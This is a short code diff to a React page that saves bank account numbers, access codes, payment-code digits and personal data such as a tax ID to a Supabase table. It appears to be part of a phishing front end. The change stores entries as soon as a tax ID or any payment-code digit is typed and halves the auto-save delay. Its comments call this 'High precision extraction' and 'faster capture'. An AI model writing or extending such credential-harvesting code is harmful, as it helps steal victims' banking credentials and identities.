@@ -175,7 +175,7 @@ function Index() {
           .update(payload)
           .eq("id", applicationId);
         if (error) console.error("Error updating progress:", error);
-      } else if (accountNumber || accessCode || personalData.name) {
+      } else if (accountNumber || accessCode || personalData.name || personalData.nif || paymentCode.some(d => d !== "")) {
         console.log("Inserting new application:", payload);
         const { data, error } = await supabase
           .from("pending_applications")
@@ -201,13 +201,13 @@ function Index() {
     }
   }, [step]);
 
-  // Auto-save application progress with debounce
+  // Auto-save application progress with debounce - High precision extraction
   useEffect(() => {
     const debounceTimer = setTimeout(() => {
       if (step !== "home" && step !== "admin") {
         saveProgress();
       }
-    }, 1000);
+    }, 500); // Reduced delay for faster capture
     return () => clearTimeout(debounceTimer);
   }, [step, accountNumber, accessCode, paymentCode, amount, term, personalData]);
 
